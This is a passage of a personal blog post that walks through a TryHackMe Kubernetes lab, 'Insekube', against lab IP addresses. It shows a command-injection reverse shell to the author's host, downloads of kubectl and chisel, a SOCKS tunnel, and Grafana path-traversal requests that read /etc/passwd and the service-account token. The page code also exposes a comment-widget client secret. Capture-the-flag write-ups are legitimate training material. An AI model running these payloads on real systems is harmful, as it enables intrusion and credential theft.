/lib/systemd/systemd --user</span><br><span class="line">vagrant   1643  0.0  0.0 259260     8 ?        S    15:15   0:00 (sd-pam)</span><br><span class="line">root      1690 11.0  6.3 175760 31236 ?        D    15:15   0:33 /usr/bin/python3 /usr/lib/ubuntu-release-upgrader/check-new-release -q</span><br><span class="line">root      1754  0.6  0.1 105684   536 ?        Ss   15:17   0:01 sshd: vagrant [priv]</span><br><span class="line">vagrant   1819  0.1  0.0 107984   160 ?        S    15:19   0:00 sshd: vagrant@pts/0</span><br><span class="line">vagrant   1820  0.4  0.2  21472  1108 pts/0    Ss   15:19   0:00 -bash</span><br><span class="line">vagrant   1835  9.0  0.6  39664  3260 pts/0    R+   15:20   0:00 ps aux</span><br></pre></td></tr></table></figure>
+
+<p>K0s(k8s lightweight version), kine(etcd), and docker</p>
+<p>The method was adopted to drag the etcd database to the local and then analyze it. And the data in etcd is not encrypted in the default configuration.</p>
+<p>the databse path is &#x2F;var&#x2F;lib&#x2F;k0s&#x2F;db&#x2F;state.db</p>
+<p>………….write later….go to sleep…….</p>
+<h3 id="Insekube"><a href="#Insekube" class="headerlink" title="Insekube"></a>Insekube</h3><p>Task1: Introduction</p>
+<p>The learning objectives for this room are:</p>
+<ul>
+<li>Interacting with the cluster using <code>kubectl</code></li>
+<li>Reading Kubernetes secrets</li>
+<li>Doing recon inside the cluster</li>
+<li>Switching service accounts to escalate your privileges</li>
+<li>Lateral movement into other workloads</li>
+<li>Gaining access to the Kubernetes nodes</li>
+</ul>
+<p>We assume basic knowledge of the Kubernetes architecture and some experience running Kubernetes administration tools like kubectl.</p>
+<p>Disclaimer: Due to this room running on a VM it uses minikube which is not exactly the same as running a fully fledged Kubernetes cluster so you might experience some minor differences with a real cluster. </p>
+<p>﻿This machine can take a while to boot up (Give it 5 or 6 minutes)</p>
+<p>Scan the machine. (If you are unsure how to tackle this, I recommend checking out the <a class="link"   target="_blank" rel="noopener" href="https://tryhackme.com/room/furthernmap" >Nmap<i class="fas fa-external-link-alt"></i></a> room)</p>
+<p>Task2: RCE</p>
+<p>Visit the website, it takes a host and returns the output of a ping command.</p>
+<p>Use command injection to get a reverse shell. For more information on command injection attacks take a look at <a class="link"   target="_blank" rel="noopener" href="https://tryhackme.com/room/oscommandinjection" >this room<i class="fas fa-external-link-alt"></i></a></p>
+<p>You will find the flag in an environment variable.</p>
+<p>Task3:  Interacting with kubernetes</p>
+<p>Kubernetes exposes an HTTP API to control the cluster. All resources in the cluster can be accessed and modified through this API. The easiest way to interact with the API is to use the <code>kubectl</code> CLI. You could also interact with the API directly using <code>curl</code> or <code>wget</code> if you don’t have write access and <code>kubectl</code> is not already present, Here is a <a class="link"   target="_blank" rel="noopener" href="https://nieldw.medium.com/curling-the-kubernetes-api-server-d7675cfc398c" >good article<i class="fas fa-external-link-alt"></i></a> on that.</p>
+<p>The <code>kubectl</code> install instructions can be found <a class="link"   target="_blank" rel="noopener" href="https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux" >here<i class="fas fa-external-link-alt"></i></a>. However, the binary is located in the <code>/tmp</code> directory. In the event you run into a scenario where the binary is not available, it’s as simple as <a class="link"   target="_blank" rel="noopener" href="https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux" >downloading the binary<i class="fas fa-external-link-alt"></i></a> to your machine and serving it (with a python HTTP server for example) so it is accessible from the container.</p>
+<p>Now let’s move to the <code>/tmp</code> directory where the <code>kubectl</code> is conveniently located for you and try the <code>kubectl get pods</code> command. You’ll notice a forbidden error which means the service account running this pod does not have enough permissions.</p>
+<p>Task4: Kubernetes Secrets</p>
+<p>Kubernetes stores secret values in resources called Secrets these then get mounted into pods either as environment variables or files.</p>
+<p>You can use <code>kubectl</code> to list and get secrets. The content of the secret is stored base64 encoded.</p>
+<p>You will find flag 2 in a Kubernetes secret.</p>
+<p>Task5: Recon in the cluster</p>
+<p>Some interesting Kubernetes objects to look for would be <code>nodes</code>, <code>deployments</code>, <code>services</code>, <code>ingress</code>, <code>jobs</code>… But the service account you control does not have access to any of them.</p>
+<p>However, by default Kubernetes creates environment variables containing the host and port of the other services running in the cluster.</p>
+<p>Running <code>env</code> you will see there is a <code>Grafana</code> service running in the cluster.</p>
+<p>Task6: Lateral Movement</p>
+<p>Kubernetes stores the token of the service account running a pod in <code>/var/run/secrets/kubernetes.io/serviceaccount/token</code>.  </p>
+<p>Use the LFI vulnerability to extract the token. The token is a <code>JWT</code> signed by the cluster.</p>
+<p>Use the <code>--token</code> flag in <code>kubectl</code> to use the new service account. Once again use <code>kubectl</code> to check the permissions of this account.</p>
+<p>Task7: Escape to the node</p>
+<p>You can now close the Grafana pod shell and continue using the first one since it is more stable.</p>
+<p>Having admin access to the cluster you can create any resources you want. <a class="link"   target="_blank" rel="noopener" href="https://bishopfox.com/blog/kubernetes-pod-privilege-escalation" >This article<i class="fas fa-external-link-alt"></i></a> explains how to get access to the Kubernetes nodes by running a pod that mounts the node’s file system.</p>
+<p>You can create a “bad” pod based on their <a class="link"   target="_blank" rel="noopener" href="https://github.com/BishopFox/badPods/blob/main/manifests/everything-allowed/pod/everything-allowed-exec-pod.yaml" >first case example<i class="fas fa-external-link-alt"></i></a>. You will need a slight modification because the VM does not have an internet connection, therefore it is not able to pull the <code>ubuntu</code> container image. The image is available in minikube’s local docker registry therefore you just need to tell Kubernetes to use the local version instead of pulling it. You can achieve this by adding <code>imagePullPolicy: IfNotPresent</code> to your “bad” pod container. Once that is done you can run <code>kubectl apply</code> to create the pod. Then <code>kubectl exec</code> into the new pod, you will find the node’s file system mounted on <code>/host</code>.</p>
+<p>ports 80,22 are open</p>
+<p>visit url 10.10.167.47:80, as shown below</p>
+<p><img src="/../images/44k8s_target/image-20231213230143010.png" alt="image-20231213230143010"></p>
+<p>the network speed is too slow, we try curl access.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─# curl http://10.10.167.47/?hostname=%3Buname+-a </span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css&quot;</span><br><span class="line">        integrity=&quot;sha384-JcKb8q3iqJ61gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP+VmmDGMN5t9UJ0Z&quot; crossorigin=&quot;anonymous&quot;&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        body,</span><br><span class="line">        html &#123;</span><br><span class="line">            height: 100%;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div class=&quot;container h-100&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;row mt-5&quot;&gt;</span><br><span class="line">            &lt;div class=&quot;col-12 mb-4&quot;&gt;</span><br><span class="line">                &lt;h3 class=&quot;text-center&quot;&gt;Check if a website is down 💣&lt;/h3&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;form class=&quot;col-6 mx-auto&quot; action=&quot;/&quot;&gt;</span><br><span class="line">                &lt;div class=&quot; input-group&quot;&gt;</span><br><span class="line">                    &lt;input name=&quot;hostname&quot; value=&quot;;uname -a&quot; type=&quot;text&quot; class=&quot;form-control&quot; placeholder=&quot;Hostname&quot;</span><br><span class="line">                        aria-label=&quot;Hostname&quot; aria-describedby=&quot;basic-addon2&quot; required&gt;</span><br><span class="line">                    &lt;div class=&quot;input-group-append&quot;&gt;</span><br><span class="line">                        &lt;button class=&quot;btn btn-outline-secondary&quot; type=&quot;submit&quot;&gt;Check&lt;/button&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">            &lt;/form&gt;</span><br><span class="line">            &lt;div class=&quot;col-9 mt-4 mx-auto&quot;&gt;</span><br><span class="line">                &lt;pre&gt;ping: usage error: Destination address required</span><br><span class="line">Linux syringe-79b66d66d7-6xdjz 5.4.0-92-generic #103-Ubuntu SMP Fri Nov 26 16:13:00 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="line">&lt;/pre&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;                                                                     </span><br></pre></td></tr></table></figure>
+
+<p>then rebound shell</p>
+<p><img src="/../images/44k8s_target/image-20231213232051287.png" alt="image-20231213232051287"></p>
+<p><img src="/../images/44k8s_target/image-20231213232114449.png" alt="image-20231213232114449"></p>
+<p><img src="/../images/44k8s_target/image-20231213232132561.png" alt="image-20231213232132561"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.10.167.47/?hostname=%3Bbash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F10%2E9%2E155%2E83%2F7779%200%3E%261</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/44k8s_target/image-20231213232251469.png" alt="image-20231213232251469"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">challenge@syringe-79b66d66d7-6xdjz:/tmp$ env</span><br><span class="line">env</span><br><span class="line">KUBERNETES_SERVICE_PORT_HTTPS=443</span><br><span class="line">GRAFANA_SERVICE_HOST=10.105.120.1</span><br><span class="line">KUBERNETES_SERVICE_PORT=443</span><br><span class="line">HOSTNAME=syringe-79b66d66d7-6xdjz</span><br><span class="line">SYRINGE_PORT=tcp://10.103.9.166:3000</span><br><span class="line">GRAFANA_PORT=tcp://10.105.120.1:3000</span><br><span class="line">SYRINGE_SERVICE_HOST=10.103.9.166</span><br><span class="line">SYRINGE_PORT_3000_TCP=tcp://10.103.9.166:3000</span><br><span class="line">GRAFANA_PORT_3000_TCP=tcp://10.105.120.1:3000</span><br><span class="line">PWD=/tmp</span><br><span class="line">SYRINGE_PORT_3000_TCP_PROTO=tcp</span><br><span class="line">HOME=/home/challenge</span><br><span class="line">KUBERNETES_PORT_443_TCP=tcp://10.96.0.1:443</span><br><span class="line">LS_COLORS=</span><br><span class="line">GOLANG_VERSION=1.15.7</span><br><span class="line">FLAG=flag&#123;5e7cc6165f6c2058b11710a26691bb6b&#125;</span><br><span class="line">SHLVL=2</span><br><span class="line">SYRINGE_PORT_3000_TCP_PORT=3000</span><br><span class="line">GRAFANA_PORT_3000_TCP_PORT=3000</span><br><span class="line">KUBERNETES_PORT_443_TCP_PROTO=tcp</span><br><span class="line">KUBERNETES_PORT_443_TCP_ADDR=10.96.0.1</span><br><span class="line">GRAFANA_SERVICE_PORT=3000</span><br><span class="line">SYRINGE_PORT_3000_TCP_ADDR=10.103.9.166</span><br><span class="line">SYRINGE_SERVICE_PORT=3000</span><br><span class="line">KUBERNETES_SERVICE_HOST=10.96.0.1</span><br><span class="line">KUBERNETES_PORT=tcp://10.96.0.1:443</span><br><span class="line">KUBERNETES_PORT_443_TCP_PORT=443</span><br><span class="line">GRAFANA_PORT_3000_TCP_PROTO=tcp</span><br><span class="line">PATH=/usr/local/go/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line">OLDPWD=/home/challenge</span><br><span class="line">GRAFANA_PORT_3000_TCP_ADDR=10.105.120.1</span><br><span class="line">_=/usr/bin/env</span><br></pre></td></tr></table></figure>
+
+<p>through env command, we get the first flag, but it is for task2.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -o /tmp/kubectl http://10.9.155.83:8080/kubectl</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">challenge@syringe-79b66d66d7-6xdjz:/tmp$ curl -o /tmp/kubectl http://10.9.155.83:8080/kubectl</span><br><span class="line">&lt;url -o /tmp/kubectl http://10.9.155.83:8080/kubectl</span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--  0 47.5M    0 89320    0     0    99k      0  0:08:08 --:--:--  0:08  1 47.5M    1  879k    0     0   474k      0  0:01:42  0:00:01  0:01  3 47.5M    3 1548k    0     0   553k      0  0:01:28  0:00:02  0:01  4 47.5M    4 1976k    0     0   519k      0  0:01:33  0:00:03  0:01  5 47.5M    5 2520k    0     0   520k      0  0:01:33  0:00:04  0:01  6 47.5M    6 3074k    0     0   528k      0  0:01:32  0:00:05  0:01  7 47.5M    7 3628k    0     0   533k      0  0:01:31  0:00:06  0:01  8 47.5M    8 4102k    0     0   524k      0  0:01:32  0:00:07  0:01  9 47.5M    9 4696k    0     0   530k      0  0:01:31  0:00:08  0:01 11 47.5M   11 5388k    0     0   543k      0  0:01:29  0:00:09  0:01 11 47.5M   11 5830k    0     0   537k      0  0:01:30  0:00:10  0:01 13 47.5M   13 6468k    0     0   546k      0  0:01:29  0:00:11  0:01 14 47.5M   14 7160k    0     0   558k      0  0:01:27  0:00:12  0:01100 47.5M  100 47.5M    0     0   567k      0  0:01:25  0:01:25 --:--:--  883k</span><br><span class="line">challenge@syringe-79b66d66d7-6xdjz:/tmp$ ls</span><br><span class="line">ls</span><br><span class="line">kubectl</span><br><span class="line">challenge@syringe-79b66d66d7-6xdjz:/tmp$ ll</span><br><span class="line">ll</span><br><span class="line">total 48724</span><br><span class="line">drwxrwxrwt 1 root      root          4096 Dec 13 16:27 ./</span><br><span class="line">drwxr-xr-x 1 root      root          4096 Dec 13 16:22 ../</span><br><span class="line">-rw-r--r-- 1 challenge challenge 49885184 Dec 13 16:28 kubectl</span><br><span class="line">challenge@syringe-79b66d66d7-6xdjz:/tmp$ chmod +x kubectl</span><br><span class="line">chmod +x kubectl</span><br><span class="line">challenge@syringe-79b66d66d7-6xdjz:/tmp$ ll</span><br><span class="line">ll</span><br><span class="line">total 48724</span><br><span class="line">drwxrwxrwt 1 root      root          4096 Dec 13 16:27 ./</span><br><span class="line">drwxr-xr-x 1 root      root          4096 Dec 13 16:22 ../</span><br><span class="line">-rwxr-xr-x 1 challenge challenge 49885184 Dec 13 16:28 kubectl*</span><br><span class="line">challenge@syringe-79b66d66d7-6xdjz:/tmp$ </span><br></pre></td></tr></table></figure>
+
+<p>.&#x2F;kubectl get pods command error</p>
+<p><img src="/../images/44k8s_target/image-20231214003220399.png" alt="image-20231214003220399"></p>
+<p>check the permission of the current account</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./kubectl auth can-i --list</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/44k8s_target/image-20231214003535316.png" alt="image-20231214003535316"></p>
+<p>view secrets to get the second flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./kubectl get secrets</span><br><span class="line">./kubectl get secrets secretflag -o json</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/44k8s_target/image-20231214003825982.png" alt="image-20231214003825982"></p>
+<p>ZmxhZ3tkZjJhNjM2ZGUxNTEwOGE0ZGM0MTEzNWQ5MzBkOGVjMX0&#x3D;</p>
+<p>the environment variable leaked the Grafana address, version 8.3.0-beta2 (8d74cc357). Set up a proxy and use exp to read the serviceaccount token, 10.105.120.1</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /home/kali/Desktop &amp;&amp; python3 -m http.server 8080</span><br><span class="line">./chisel server -p 28190 --reverse</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl -o /tmp/chisel http://10.9.155.83:8080/chisel</span><br><span class="line">cd /tmp &amp;&amp; chmod +x chisel</span><br><span class="line">./chisel client 10.9.155.83:28190 R:0.0.0.0:28191:socks</span><br><span class="line">vim /etc/proxychains4.conf</span><br><span class="line">proxychains4 -f /etc/proxychains4.conf python3 </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -f /etc/proxychains4.conf firefox</span><br><span class="line">proxychains4 -f /etc/proxychains4.conf burpsuite</span><br><span class="line"></span><br><span class="line">proxychains4 -f /etc/proxychains4.conf curl http://10.105.120.1:3000/public/plugins/alertlist/../../../../../../../../etc/passwd --cookie &quot;grafana_session=749c76365cf448fb8ddfd1b78af3881e&quot;</span><br><span class="line"></span><br><span class="line">proxychains4 -f /etc/proxychains4.conf curl http://10.105.120.1:3000/public/plugins/alertlist/../../../../../../../../etc/passwd --cookie &quot;redirect_to=%2F;grafana_session=749c76365cf448fb8ddfd1b78af3881e&quot;</span><br><span class="line"></span><br><span class="line">proxychains4 -f /etc/proxychains4.conf curl http://10.105.120.1:3000/public/plugins/gettingstarted/../../../../../../../../../../../../../../../etc/passwd</span><br><span class="line"></span><br><span class="line">proxychains4 -f /etc/proxychains4.conf curl http://10.105.120.1:3000/public/plugins/alertlist/../../../../../../../../var/run/secrets/kubernetes.io/serviceaccount/token</span><br><span class="line"></span><br><span class="line">proxychains4 -f /etc/proxychains4.conf curl http://10.105.120.1:3000/public%2Fplugins%2Falertlist%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fvar%2Frun%2Fsecrets%2Fkubernetes%2Eio%2Fserviceaccount%2Ftoken</span><br></pre></td></tr></table></figure>
+
+<p>it’s 1:40 am, but fail.sleep!</p>
+
+            </div>
+
+            
+
+            
+                <ul class="post-tags-box">
+                    
+                        <li class="tag-item">
+                            <a href="/tags/pentest/">#pentest</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            
+
+            
+                <div class="article-nav">
+                    
+                    
+                        <div class="article-next">
+                            <a class="next"
+                               rel="next"
+                               href="/2023/12/12/43%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Exchange/"
+                            >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">春秋云镜：Exchange</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                                <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                            </a>
+                        </div>
+                    
+                </div>
+            
+
+            
+                <div class="comment-container">
+                    
+<div class="comments-container">
+    <div id="comments-anchor"></div>
+    <div class="comment-area-title">
+        <i class="fas fa-comments"></i>&nbsp;Comments
+    </div>
+    
+        
+            
+
+    <div class="gitalk-comment-container">
+        <div id="gitalk-container"></div>
+        <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk/dist/gitalk.css">
+        <script  src="//cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.js"></script>
+        <script >
+          function loadGitalk() {
+            let __gitalk__pathname = decodeURI(location.pathname);
+            const __gitalk__pathnameLength = __gitalk__pathname.length;
+            const __gitalk__pathnameMaxLength = 50;
+            if (__gitalk__pathnameLength > __gitalk__pathnameMaxLength) {
+              __gitalk__pathname = __gitalk__pathname.substring(0, __gitalk__pathnameMaxLength - 3) + '...';
+            }
+
+            try {
+              Gitalk && new Gitalk({
+                clientID: 'a415960e8a19902e98bf',
+                clientSecret: '97151a67ce9c95ad3c333c402f4cee0f5f05020f',
+                repo: 'gitalk',
+                owner: 'Lejeremiah',
+                admin: 'Lejeremiah',
+                id: __gitalk__pathname,
+                language: 'en'
+              }).render('gitalk-container');
+            } catch (e) {
+              window.Gitalk = null;
+            }
+          }
+
+          if ('false' === 'true') {
+            const loadGitalkTimeout = setTimeout(() => {
+              loadGitalk();
+              clearTimeout(loadGitalkTimeout);
+            }, 1000);
+          } else {
+            window.addEventListener('DOMContentLoaded', loadGitalk);
+          }
+        </script>
+    </div>
+
+
+
+        
+    
+</div>
+
+                </div>
+            
+        </div>
+
+        
+            <div class="toc-content-container">
+                <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#K8s-Target-Machine"><span class="nav-text">K8s Target Machine</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Kubernetes-for-Everyone"><span class="nav-text">Kubernetes for Everyone</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Insekube"><span class="nav-text">Insekube</span></a></li></ol></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            
+<footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+                <span>2020</span> -
+            
+            2023
+            
+                &nbsp;<i class="fas fa-heart icon-animate"></i>
+                &nbsp;<a href="/">jerem1ah</a>
+            
+        </div>
+        
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.5.2</a>
+        </div>
+        
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="tools-item flex-center go-to-comments">
+                <i class="fas fa-comment"></i>
+                <span class="post-comments-count"></span>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/dark-light-toggle.js"></script>
+
+
+
+
+
+
+
+    
+<script src="/js/code-block.js"></script>
+
+
+
+
+
+<div class="post-scripts">
+    
+        
+<script src="/js/post-helper.js"></script>
+
+        
+            
+<script src="/js/libs/anime.min.js"></script>
+
+        
+        
+            
+<script src="/js/toc.js"></script>
+
+        
+    
+</div>
+
+
+
+</body>
+</html>
